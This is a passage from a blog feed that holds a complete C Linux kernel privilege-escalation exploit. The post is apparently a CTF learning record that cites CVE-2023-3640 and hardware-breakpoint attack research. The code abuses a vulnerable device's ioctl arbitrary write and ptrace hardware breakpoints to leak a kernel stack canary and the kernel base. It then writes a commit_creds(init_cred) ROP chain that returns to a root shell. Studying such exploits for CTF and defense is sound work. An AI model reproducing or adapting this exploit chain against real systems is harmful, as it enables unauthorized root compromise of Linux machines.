class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-comment">// [+] commit_creds---&gt;0xffffffff810eeec0</span><br><span class="hljs-comment">// [+] init_cred---&gt;0xffffffff82e8abe0</span><br><span class="hljs-comment">// [+] swapgs_restore_regs_and_return_to_usermode---&gt;0xffffffff81e010b0</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], rop_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> canary;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> leak;<br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-number">0xffffffff810eeec0</span>;<br><span class="hljs-type">size_t</span> init_cred = <span class="hljs-number">0xffffffff82e8abe0</span>;<br><span class="hljs-type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81e010b0</span>;<br><span class="hljs-type">size_t</span> pop_rdi = <span class="hljs-number">0xffffffff810aaa80</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root_shell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(getuid()) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        sleep(<span class="hljs-number">5</span>);<br>        <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);<br>    <br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <br>    <span class="hljs-comment">/* to exit the process normally, instead of segmentation fault */</span><br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> value)</span><br>&#123;<br>    ioctl(dev_fd , <span class="hljs-number">0x7204</span> , value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(<span class="hljs-number">0x10</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br>    <br>    <span class="hljs-type">int</span> step = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        <span class="hljs-keyword">switch</span> (step)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            uname(uts);<br>            <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>            &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>                write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>                step++;<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Wait for ROP chain&quot;</span>);<br>            <span class="hljs-keyword">if</span> (read(rop_pipe[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE) &lt; <span class="hljs-number">0</span>)<br>                err_exit(<span class="hljs-string">&quot;read ROP chain&quot;</span>);<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Get ROP chain successfully&quot;</span>);<br>            step++;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Try to write ROP chain&quot;</span>);<br>            <span class="hljs-comment">// path 2</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">mm_map</span>;</span><br>            mm_map.start_code  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_code    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_data  = <span class="hljs-number">0x1000000</span>;<br>            mm_map.end_data    = <span class="hljs-number">0x1100000</span>;<br>            mm_map.start_brk   = <span class="hljs-number">0x2000000</span>;<br>            mm_map.brk         = <span class="hljs-number">0x2000000</span>;<br>            mm_map.start_stack = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.arg_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_start   = <span class="hljs-number">0x1000000</span>;<br>            mm_map.env_end     = <span class="hljs-number">0x1000000</span>;<br>            mm_map.auxv        = MMAP_ADDR;<br>            mm_map.auxv_size   = <span class="hljs-number">0x140</span>;<br>            mm_map.exe_fd      = <span class="hljs-number">-2</span>;<br>            prctl(PR_SET_MM, PR_SET_MM_MAP, &amp;mm_map, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map), <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x7201</span>, CPU_ENTRY_AREA_DB_STACK_RCX_ADDR);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++)<br>    &#123;<br>        ioctl(dev_fd, <span class="hljs-number">0x7202</span>, <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">11</span>; i++)<br>    &#123;<br>        ioctl(dev_fd, <span class="hljs-number">0x7202</span>, <span class="hljs-number">1</span>);<br>    &#125;<br><br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">0</span>);<br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">1</span>);<br>    ioctl(dev_fd, <span class="hljs-number">0x7203</span>, <span class="hljs-number">2</span>);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/seven&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br><br>    init();<br><br>    mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br><br>    pipe(pipe_fd);<br>    pipe(rop_pipe);<br><br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;canary, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-number">0x20</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] canary is 0x%lx\n&quot;</span>, canary);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    kernel_offset = leak - <span class="hljs-number">0xffffffff810d7182</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    pop_rdi += kernel_offset;<br>    init_cred += kernel_offset;<br>    commit_creds += kernel_offset;<br>    swapgs_restore_regs_and_return_to_usermode += kernel_offset;<br><br>    <span class="hljs-built_in">memset</span>(MMAP_ADDR, <span class="hljs-number">0</span> , MMAP_SIZE);<br>    <span class="hljs-type">size_t</span> *rop_chain = MMAP_ADDR;<br>    <span class="hljs-type">int</span> canary_idx = <span class="hljs-number">0x30</span>;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0x37</span>;<br><br>    rop_chain[canary_idx] = canary;<br>    rop_chain[idx++] = pop_rdi;<br>    rop_chain[idx++] = init_cred;<br>    rop_chain[idx++] = commit_creds;<br>    rop_chain[idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="hljs-number">54</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = <span class="hljs-number">0</span>;<br>    rop_chain[idx++] = (<span class="hljs-type">size_t</span>)get_root_shell;<br>    rop_chain[idx++] = user_cs;<br>    rop_chain[idx++] = user_rflags;<br>    rop_chain[idx++] = user_sp;<br>    rop_chain[idx++] = user_ss;<br><br><br>    write(rop_pipe[<span class="hljs-number">1</span>], rop_chain, MMAP_SIZE);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <br><br>    <span class="hljs-comment">// 0xffffc90000247c00</span><br>    <span class="hljs-comment">// canary :0xffffc90000247db8</span><br>    <span class="hljs-comment">// ret_addr = 0xffffc90000247db8</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><p><a href="https://github.com/pray77/CVE-2023-3640/blob/main/README.md">CVE-2023-3640&#x2F;README.md at main · pray77&#x2F;CVE-2023-3640 (github.com)</a></p><p><a href="https://veritas501.github.io/2023_03_22-%E4%B8%80%E7%A7%8D%E5%80%9F%E5%8A%A9%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9%E7%9A%84%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">一种借助硬件断点的提权思路分析与演示 (veritas501.github.io)</a></p><p><a href="https://github.com/veritas501/hbp_attack_demo">veritas501&#x2F;hbp_attack_demo: linux kernel LPE using hw_breakpoint attack tech demo (github.com)</a></p><p><a href="https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html">https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023【祭】无为的一年</title>
    <link href="/2023/12/30/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/30/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
